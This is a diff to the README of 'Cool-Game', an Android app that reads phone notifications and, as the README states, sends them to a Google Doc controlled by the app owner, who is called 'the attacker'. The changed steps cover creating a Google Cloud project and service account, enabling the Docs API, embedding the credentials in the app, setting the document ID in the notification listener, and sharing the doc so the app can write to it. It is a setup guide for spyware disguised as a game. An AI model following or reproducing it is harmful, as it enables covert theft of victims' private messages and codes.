@@ -26,17 +26,18 @@ Cool-Game is an Android application that monitors device (i.e., phone) notificat
 
 3. Create a credentials.json file:
    - As the (cool-game) app owner (the attacker) you need a gmail id (x).
-   - Go to the Google Cloud Console and create a "service account". The cool-game app will utilize the "service account" to write to a google doc.
+   - Go to the Google Cloud Console and create a project (p) and create a "service account". The cool-game app will utilize the "service account" to write to a google doc.
    - Get the credentials of the "service account" as a JSON file.
    - Place it in `app/src/main/assets/credentials.json`. Make the format similar to dummy_credentials.json.
 
-4. Manually create a new google document on docs.google.com while logged in using the above gmail id (x). Get the Google Docs document ID. As an example, https://docs.google.com/document/d/abcd/ implies that the google docs document ID is abcd. Then, update the Google Docs document ID in `MyNotificationListenerService.kt`:
+4. On the Google Cloud Console, for the same project (p), enable "Google Docs API".
+5. Manually create a new google document on docs.google.com while logged in using the above gmail id (x). Get the Google Docs document ID. As an example, https://docs.google.com/document/d/abcd/ implies that the google docs document ID is abcd. Then, update the Google Docs document ID in `MyNotificationListenerService.kt`:
    ```kotlin
    val documentId = "abcd"
    ```
 
-5. Go to the Google Cloud Console and go to the same "service account". Get the email address (y) of the "service account". Note that this email address (y) is different than app owner's gmail id (x). Then, go to the google doc at https://docs.google.com/document/d/abcd/ and click on the "Share" button and give the service account email id (y) edit permission.
-6. Build and run the application
+6. Go to the Google Cloud Console and go to the same "service account". Get the email address (y) of the "service account". Note that this email address (y) is long (ending with *.iam.gserviceaccount.com) and it is different than app owner's gmail id (x). Then, go to the google doc at https://docs.google.com/document/d/abcd/ and click on the "Share" button and give the service account email id (y) edit permission.
+7. Build and run the application
 
 ### Required Permissions
 The app requires the following permissions:
